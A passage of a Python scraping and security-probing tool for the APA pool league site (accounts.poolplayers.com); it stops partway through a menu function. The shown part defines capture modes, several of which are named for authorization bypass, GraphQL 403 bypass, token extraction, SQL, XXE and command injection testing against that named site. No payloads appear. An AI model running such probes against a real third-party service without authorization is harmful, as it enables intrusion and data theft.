"""
apa_api_sniffer_v2.py
Enhanced API sniffer with:
- Clean CLI output with progress tracking
- Better state management and resume
- Comprehensive API capture
- Refactored modular code structure
"""

import asyncio
import json
import os
import time
from pathlib import Path
from urllib.parse import urlparse
from datetime import datetime
from getpass import getpass

from dotenv import load_dotenv
from playwright.async_api import async_playwright, TimeoutError as PWTimeoutError
import requests
import base64

load_dotenv()

HEADLESS = os.getenv("APA_HEADLESS", "0") == "1"
APA_LOGIN_URL = "https://accounts.poolplayers.com/login"
MAX_CONCURRENT_PAGES = 5

API_BASE_DIR = Path("apa_api_captures")
API_BASE_DIR.mkdir(exist_ok=True)

# Output paths (set per run)
RUN_ID = None
RUN_DIR = None
API_DUMP_FILE = None
URLS_USED_FILE = None
IMAGES_DIR = None
IMAGES_INDEX_FILE = None
PROGRESS_FILE = None
STATE_FILE = None

# API collection storage
captured_apis = {}
api_count = 0
capture_mode = "api_only"  # Will be set by user
CAPTURE_MODES = {
    "1": {
        "name": "API calls only",
        "key": "api_only",
        "desc": "Capture JSON/GraphQL API responses",
        "collect_apis": True,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "2": {
        "name": "APIs + Screenshots",
        "key": "api_screenshots",
        "desc": "Capture APIs and page screenshots",
        "collect_apis": True,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "3": {
        "name": "APIs + Images",
        "key": "api_images",
        "desc": "Capture APIs and download images from pages",
        "collect_apis": True,
        "collect_images": True,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "4": {
        "name": "APIs + DOM snapshot",
        "key": "api_dom",
        "desc": "Capture APIs and page HTML/DOM",
        "collect_apis": True,
        "collect_images": False,
        "collect_dom": True,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "5": {
        "name": "Network Analysis",
        "key": "network_analysis",
        "desc": "Deep network inspection: requests, headers, errors, WebSockets",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": True,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "6": {
        "name": "Client-Side Intelligence",
        "key": "client_intelligence",
        "desc": "Console logs, JS errors, performance metrics, state snapshots",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": True,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "7": {
        "name": "Session & Auth Analysis",
        "key": "session_auth",
        "desc": "Extract tokens, API keys, session storage, IndexedDB",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": True,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "8": {
        "name": "Page Behavior Analysis",
        "key": "page_behavior",
        "desc": "User interactions, performance, a11y issues, third-party scripts",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": True,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "9": {
        "name": "Content Extraction",
        "key": "content_extraction",
        "desc": "Extract structured data, rendered text, forms, and link maps",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": True,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "10": {
        "name": "Advanced Tracking",
        "key": "advanced_tracking",
        "desc": "Pixel tracking, CDN headers, CORS analysis, security headers, API patterns",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": True,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "11": {
        "name": "GraphQL/Direct API Testing",
        "key": "graphql_direct",
        "desc": "Test GraphQL endpoints and direct API calls with authentication",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": True,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "12": {
        "name": "Authorization Bypass Testing",
        "key": "auth_bypass",
        "desc": "Test authorization bypass techniques (401/403 bypass, permission escalation, etc.)",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": True,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "13": {
        "name": "Everything",
        "key": "comprehensive",
        "desc": "Complete security & data capture: APIs, network, client-side, auth, behavior, content, tracking, screenshots, DOM, GraphQL, Auth Bypass, Advanced GraphQL Bypass, PoolPlayers Bypass, Form Auto-fill, Response Caching, Data Leakage, Hidden Endpoints, CORS Analysis, JWT Analysis, API Key Exposure, SQL Injection, XXE Injection, Command Injection",
        "collect_apis": True,
        "collect_images": True,
        "collect_dom": True,
        "collect_network": True,
        "collect_client_intelligence": True,
        "collect_session_auth": True,
        "collect_page_behavior": True,
        "collect_content_extraction": True,
        "collect_advanced_tracking": True,
        "collect_graphql_direct": True,
        "collect_auth_bypass": True,
        "collect_advanced_graphql_bypass": True,
        "collect_gql_poolplayers_bypass": True,
        "collect_form_autodetection": True,
        "collect_response_caching": True,
        "collect_data_leakage": True,
        "collect_hidden_endpoints": True,
        "collect_cors_analysis": True,
        "collect_jwt_analysis": True,
        "collect_api_key_exposure": True,
        "collect_sqli_testing": True,
        "collect_xxe_injection": True,
        "collect_command_injection": True,
    },
    "14": {
        "name": "Advanced GraphQL 403 Bypass Testing",
        "key": "advanced_graphql_bypass",
        "desc": "Advanced GraphQL-specific bypass techniques for 403 Forbidden errors",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": True,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "15": {
        "name": "PoolPlayers GQL Bypass Testing",
        "key": "gql_poolplayers_bypass",
        "desc": "Specialized bypass testing for PoolPlayers GraphQL endpoint",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": True,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "16": {
        "name": "Form Auto-fill Detection",
        "key": "form_autodetection",
        "desc": "Detect auto-fillable forms and what data fields they accept",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": True,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
    },
    "17": {
        "name": "API Response Caching Analysis",
        "key": "response_caching",
        "desc": "Detect cached responses and analyze cache headers and directives",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": True,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
    },
    "18": {
        "name": "Data Leakage Detection",
        "key": "data_leakage",
        "desc": "Find PII/sensitive data in responses (emails, phone, SSN, credit cards, API keys)",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": True,
        "collect_hidden_endpoints": False,
    },
    "19": {
        "name": "Hidden/Debug Endpoints Discovery",
        "key": "hidden_endpoints",
        "desc": "Discover hidden, debug, and internal endpoints",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": True,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "20": {
        "name": "CORS Policy Analysis",
        "key": "cors_analysis",
        "desc": "Deep dive into CORS misconfigurations and cross-origin bypass opportunities",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": True,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "21": {
        "name": "JWT Token Analysis",
        "key": "jwt_analysis",
        "desc": "Decode and analyze JWT tokens for weak signatures, exp claims, kid manipulation",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": True,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "22": {
        "name": "API Key Exposure Detection",
        "key": "api_key_exposure",
        "desc": "Detect hardcoded API keys, tokens in responses, localStorage, or URLs",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": True,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "23": {
        "name": "SQL Injection Testing",
        "key": "sqli_testing",
        "desc": "Test query parameters for SQLi vulnerabilities",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": True,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
    },
    "24": {
        "name": "XML/XXE Injection Testing",
        "key": "xxe_injection",
        "desc": "If API accepts XML, test for XXE attacks",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": True,
        "collect_command_injection": False,
    },
    "25": {
        "name": "Command Injection Testing",
        "key": "command_injection",
        "desc": "Test parameters for RCE/command execution vulnerabilities",
        "collect_apis": False,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": False,
        "collect_client_intelligence": False,
        "collect_session_auth": False,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": False,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": True,
    },
    "26": {
        "name": "GraphQL Authorization Bypass Testing",
        "key": "graphql_authz_bypass",
        "desc": "Test GraphQL endpoints for authorization/permission bypass vulnerabilities",
        "collect_apis": True,
        "collect_images": False,
        "collect_dom": False,
        "collect_network": True,
        "collect_client_intelligence": False,
        "collect_session_auth": True,
        "collect_page_behavior": False,
        "collect_content_extraction": False,
        "collect_advanced_tracking": False,
        "collect_graphql_direct": False,
        "collect_auth_bypass": False,
        "collect_advanced_graphql_bypass": False,
        "collect_gql_poolplayers_bypass": False,
        "collect_form_autodetection": False,
        "collect_response_caching": False,
        "collect_data_leakage": False,
        "collect_hidden_endpoints": False,
        "collect_cors_analysis": False,
        "collect_jwt_analysis": True,
        "collect_api_key_exposure": False,
        "collect_sqli_testing": False,
        "collect_xxe_injection": False,
        "collect_command_injection": False,
        "collect_graphql_authz_bypass": True,
    },
}


# ================================================================================
# CLI OUTPUT
# ================================================================================

class CliOutput:
    @staticmethod
    def header(text):
        print(f"\n{'=' * 70}\n  {text}\n{'=' * 70}\n")

    @staticmethod
    def info(text, indent=0):
        print(f"{'  ' * indent}ℹ️  {text}")

    @staticmethod
    def success(text, indent=0):
        print(f"{'  ' * indent}✅ {text}")

    @staticmethod
    def warn(text, indent=0):
        print(f"{'  ' * indent}⚠️  {text}")

    @staticmethod
    def error(text, indent=0):
        print(f"{'  ' * indent}❌ {text}")

    @staticmethod
    def status(text):
        print(f"   → {text}")


# ================================================================================
# RUN MANAGEMENT
# ================================================================================

def init_run(is_new_run, chosen_dir=None):
    """Initialize or resume a run."""
    global RUN_ID, RUN_DIR, API_DUMP_FILE, URLS_USED_FILE, IMAGES_DIR, IMAGES_INDEX_FILE, PROGRESS_FILE, STATE_FILE

    if is_new_run:
        RUN_ID = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        RUN_DIR = API_BASE_DIR / RUN_ID
        RUN_DIR.mkdir(parents=True, exist_ok=True)
        CliOutput.success(f"Created new run: {RUN_ID}")
    else:
        RUN_DIR = chosen_dir
        RUN_ID = RUN_DIR.name
        CliOutput.success(f"Resumed run: {RUN_ID}")

    API_DUMP_FILE = RUN_DIR / "api_dump_v2.json"
    URLS_USED_FILE = RUN_DIR / "page_urls_used.txt"
    IMAGES_DIR = RUN_DIR / "images"
    IMAGES_INDEX_FILE = IMAGES_DIR / "images_index.json"
    PROGRESS_FILE = RUN_DIR / "progress.json"
    STATE_FILE = RUN_DIR / "state.json"


def select_run():
    """Let user create new or resume existing run."""
    existing = sorted([d for d in API_BASE_DIR.iterdir() if d.is_dir()], key=lambda p: p.name, reverse=True)
    
    # Non-interactive auto-create when pipeline invokes with AUTO_NEW_RUN=1
    if os.getenv("AUTO_NEW_RUN") == "1":
        CliOutput.info("AUTO_NEW_RUN detected: creating new run")
        init_run(True)
        return True

    if not existing:
        CliOutput.info("No existing runs found; creating new run")
        init_run(True)
        return True

    CliOutput.info("Run options:")
    print("  1) Create NEW run")
    print("  2) Resume existing run")
    choice = input("Select [1/2] (default 1): ").strip()

    if choice == "2":
        print("\nExisting runs:")
        for idx, d in enumerate(existing[:10], start=1):
            print(f"  {idx}) {d.name}")
        sel = input("Select run number (default 1): ").strip()
        try:
            idx = max(0, min(len(existing) - 1, int(sel) - 1 if sel else 0))
        except ValueError:
            idx = 0
        init_run(False, existing[idx])
        return False
    else:
        init_run(True)
        return True


def load_urls():
    """Load or select URLs to process."""
    CliOutput.info("URL Selection")

    # Non-interactive: if pipeline asked to auto-use discovery results
    if os.getenv("AUTO_USE_DISCOVERY") == "1":
        discovery_dir = Path("apa_url_discovery")
        if discovery_dir.exists():
            latest = sorted([p for p in discovery_dir.iterdir() if p.is_dir()], key=lambda p: p.name, reverse=True)
            if latest:
                latest_run = latest[0]
                all_urls = latest_run / "all_urls.txt"
                if all_urls.exists():
                    urls = [line.strip() for line in all_urls.read_text().splitlines() if line.strip()]
                    URLS_USED_FILE.write_text("\n".join(urls))
                    CliOutput.success(f"AUTO: Loaded {len(urls)} URLs from discovery {latest_run.name}")
                    return urls

    # Try load from existing run
    if URLS_USED_FILE.exists():
        urls = [line.strip() for line in URLS_USED_FILE.read_text().splitlines() if line.strip()]
        CliOutput.status(f"Found {len(urls)} URLs in current run")
        choice = input("  Use existing URLs? (y/n, default y): ").strip().lower()
        if choice != "n":
            return urls

    # Try discovery output
    available_sources = []
    
    discovery_dir = Path("apa_url_discovery")
    if discovery_dir.exists():
        for run_dir in sorted(discovery_dir.iterdir(), key=lambda p: p.name, reverse=True):
            all_urls = run_dir / "all_urls.txt"
            if all_urls.exists():
                count = len([l for l in all_urls.read_text().splitlines() if l.strip()])
                available_sources.append(("discovery", run_dir.name, count, all_urls))

    # Display numbered menu for URL sources
    custom_file = None
    
    if available_sources:
        CliOutput.status("Available discovery runs:")
        for idx, (src_type, name, count, path) in enumerate(available_sources, 1):
            print(f"  {idx}) {name} ({count} URLs)")
    else:
        CliOutput.status("No discovery runs found. Select source:")
    
    # Always show custom file and manual entry options
    option_custom_file = len(available_sources) + 1
    option_manual = len(available_sources) + 2
    print(f"  {option_custom_file}) Load from custom file")
    print(f"  {option_manual}) Enter URLs manually")

    choice = input("Select source (default 1): ").strip()
    try:
        idx = int(choice) - 1 if choice else 0
    except ValueError:
        idx = 0

    if 0 <= idx < len(available_sources):
        urls = [line.strip() for line in available_sources[idx][3].read_text().splitlines() if line.strip()]
        URLS_USED_FILE.write_text("\n".join(urls))
        CliOutput.success(f"Loaded {len(urls)} URLs from {available_sources[idx][1]}")
        return urls
    elif idx == option_custom_file - 1:
        custom_file = input("  Enter file path: ").strip()
    elif idx == option_manual - 1:
        urls = []
        CliOutput.info("Enter URLs (one per line, empty line to finish):")
        while True:
            url = input("  > ").strip()
            if not url:
                break
            urls.append(url)
        if urls:
            URLS_USED_FILE.write_text("\n".join(urls))
            return urls
        return []

    # Load custom file
    if custom_file and Path(custom_file).exists():
        urls = [line.strip() for line in Path(custom_file).read_text().splitlines() if line.strip()]
        URLS_USED_FILE.write_text("\n".join(urls))
        CliOutput.success(f"Loaded {len(urls)} URLs from {custom_file}")
        return urls

    CliOutput.error("No URLs loaded")
    return []


def load_progress(total_urls):
    """Load progress from last run."""
    if not PROGRESS_FILE.exists():
        return -1
    try:
        data = json.loads(PROGRESS_FILE.read_text())
        idx = int(data.get("last_index", -1))
        if 0 <= idx < total_urls:
            CliOutput.info(f"Resuming from URL {idx + 1}/{total_urls}")
            return idx
    except Exception:
        pass
    return -1


def save_progress(idx):
    """Save progress."""
    try:
        current = -1
        if PROGRESS_FILE.exists():
            try:
                data = json.loads(PROGRESS_FILE.read_text())
                current = int(data.get("last_index", -1))
            except Exception:
                pass
        new_idx = max(current, idx)
        PROGRESS_FILE.write_text(json.dumps({"last_index": new_idx, "timestamp": datetime.now().isoformat()}))
    except Exception as e:
        CliOutput.warn(f"Could not save progress: {e}")


def select_capture_mode():
    """Let user select what to capture."""
    global capture_mode
    # Allow non-interactive override via environment variable AUTO_CAPTURE_MODE
    env_choice = os.getenv("AUTO_CAPTURE_MODE") or os.getenv("CAPTURE_MODE")
    if env_choice and env_choice in CAPTURE_MODES:
        choice = env_choice
        CliOutput.info(f"AUTO: Using capture mode {choice}: {CAPTURE_MODES[choice]['name']}")
        capture_mode = CAPTURE_MODES[choice]["key"]
        return CAPTURE_MODES[choice]

    CliOutput.info("Select capture mode:")
    for key, mode in CAPTURE_MODES.items():
        print(f"  {key}) {mode['name']}")
        print(f"     └─ {mode['desc']}")

    # Show detailed feature explanations
    print("\n  💡 Network Analysis (mode 5) captures:")
    print("     • All HTTP requests (method, URL, headers, POST bodies)")
    print("     • Response headers and status codes")
    print("     • Failed requests (4xx, 5xx errors)")
    print("     • WebSocket connections for real-time features")
    
    print("\n  🧠 Client-Side Intelligence (mode 6) captures:")
    print("     • Console logs, warnings, and error messages")
    print("     • JavaScript exceptions with full stack traces")
    print("     • Core Web Vitals (LCP, FID, CLS performance metrics)")
    print("     • Redux/Zustand state snapshots at key moments")
    print("     • XHR/Fetch network calls from JavaScript")
    
    print("\n  🔐 Session & Auth Analysis (mode 7) captures:")
    print("     • JWT and OAuth tokens from responses and headers")
    print("     • Session IDs and authentication cookies")
    print("     • Hardcoded API keys in response bodies")
    print("     • sessionStorage and IndexedDB data")
    print("     • Authentication mechanisms and token patterns")
    
    print("\n  📊 Page Behavior Analysis (mode 8) captures:")
    print("     • User interactions: clicks, form fills, navigation events")
    print("     • Performance metrics: FCP, paint times, resource sizes")
    print("     • Accessibility (a11y) violations and issues")
    print("     • Third-party scripts and trackers loaded on page")
    print("     • Unused CSS/JS and performance opportunities")
    
    print("\n  📄 Content Extraction (mode 9) captures:")
    print("     • JSON-LD structured data schemas")
    print("     • Microdata and semantic markup")
    print("     • Rendered text content (not just HTML source)")
    print("     • Form fields, inputs, labels, and available options")
    print("     • Link maps organized by type (internal/external, CTA, nav)")
    
    print("\n  🔍 Advanced Tracking (mode 10) captures:")
    print("     • Analytics pixels and tracking calls")
    print("     • CDN and cache directives (Cache-Control, ETag)")
    print("     • Cross-origin (CORS) requests and policies")
